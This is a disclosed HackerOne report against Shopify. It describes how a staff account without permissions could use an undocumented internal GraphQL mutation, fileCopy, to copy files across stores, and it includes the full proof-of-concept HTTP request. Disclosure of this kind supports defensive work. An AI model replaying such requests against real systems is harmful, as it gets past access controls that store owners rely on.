# Undocumented `fileCopy` GraphQL API

## Report Details
- **Report ID**: 981472
- **URL**: https://hackerone.com/reports/981472
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-14T05:56:11.272Z
- **Disclosed**: 2020-10-22T18:43:38.511Z

## Reporter
- **Username**: ash_nz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Impact
A malicious staff account with no permissions can copy other store file assets to current store, which they have no access to.

## Details
So the story as follow 
A malicious staff member (jack_mccracken) on storeA.myshopify.com wants to upload a file on the store but could not, due to permissions restrictions. So jack_mccracken decided to find a way to bypass the restriction so he created a new store called `storeB.myshopify.com` and uploaded a file on storeB.

jack_mccracken is a skilled attacker he found an undocumented GraphQL API called `fileCopy`, he used this API to try to copy a file from his store `StorB`  to `StoreA` (where he is a staff member). 

He login into StoreA (as staff member) and send the following request:

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: a02c5039-29f0-4280-9084-cfe12703ff60
Host: storeA.myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 485

{"query":"\r\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\r\nfile{\r\n    \r\n    path\r\n}\r\n userErrors {\r\n    field\r\n    message\r\n}\r\n    }\r\n}","variables":{
                        "absoluteKey": "s/files/1/d/0864/0471/6006/6199/files/1.jpg",
                        "key": "files/1.jpg",
                        "path": "https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"
}
}
```

the variables `absoluteKey` `key` and `path`values  are the values of the file he uploaded in his store `storeB`

THE END

## Impact

A malicious staff account with no permissions can copy other store file assets to current store, which they have no access to.

## Attachments
No attachments
